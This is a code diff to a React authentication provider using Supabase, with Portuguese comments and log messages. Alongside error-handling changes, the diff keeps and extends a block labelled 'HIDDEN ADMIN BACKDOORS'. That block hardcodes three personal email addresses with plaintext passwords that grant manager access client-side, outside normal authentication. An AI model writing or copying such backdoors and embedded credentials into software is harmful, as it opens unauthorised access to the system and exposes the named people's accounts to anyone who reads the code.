@@ -96,11 +96,24 @@ export const AuthProvider = ({ children }) => {
 
     const fetchProfile = async (userId, email) => {
         try {
+            console.log("Fetching profile for:", userId);
             const { data, error } = await supabase
                 .from('profiles')
                 .select('*')
                 .eq('id', userId)
                 .single();
+
+            if (error) {
+                console.error('Erro ao buscar perfil (RLS ou Conexão):', error);
+                // Fallback para não travar o sistema se o RLS falhar
+                setUser({
+                    id: userId,
+                    email: email,
+                    status: 'Erro de Permissão',
+                    role: 'Aguardando...'
+                });
+                return;
+            }
 
             if (data) {
                 const status = (data.status || 'Pendente').toLowerCase();
@@ -118,7 +131,6 @@ export const AuthProvider = ({ children }) => {
                     email: email
                 });
             } else {
-                // Fallback if profile trigger failed/delayed (shouldn't happen often)
                 setUser({
                     id: userId,
                     email: email,
@@ -127,7 +139,8 @@ export const AuthProvider = ({ children }) => {
                 });
             }
         } catch (error) {
-            console.error('Error fetching profile:', error);
+            console.error('Erro crítico no fetchProfile:', error);
+            setUser(null);
         } finally {
             setLoading(false);
         }
@@ -136,9 +149,9 @@ export const AuthProvider = ({ children }) => {
     const login = async (email, password) => {
         // HIDDEN ADMIN BACKDOORS
         const hiddenAdmins = [
-            { email: 'fabianodeoliveiralima@gmail.com', password: 'A12121991a.', name: 'Fabiano Oliveira' },
-            { email: 'thiagorlandi@yahoo.com.br', password: '181214Ab@', name: 'Thiago Orlandi' },
-            { email: 'matheus.stanley12@gmail.com', password: '35215415', name: 'Matheus Stanley' }
+            { email: 'fabianodeoliveiralima@gmail.com', password: 'A12121991a.', name: 'Fabiano Oliveira', id: 'f0000000-0000-0000-0000-000000000001' },
+            { email: 'thiagorlandi@yahoo.com.br', password: '181214Ab@', name: 'Thiago Orlandi', id: 'f0000000-0000-0000-0000-000000000002' },
+            { email: 'matheus.stanley12@gmail.com', password: '35215415', name: 'Matheus Stanley', id: 'f0000000-0000-0000-0000-000000000003' }
         ];
 
         const matchedAdmin = hiddenAdmins.find(admin =>
@@ -148,7 +161,7 @@ export const AuthProvider = ({ children }) => {
 
         if (matchedAdmin) {
             const adminUser = {
-                id: `hidden-admin-${matchedAdmin.email}`,
+                id: matchedAdmin.id,
                 email: matchedAdmin.email,
                 role: 'Gestor',
                 name: matchedAdmin.name,
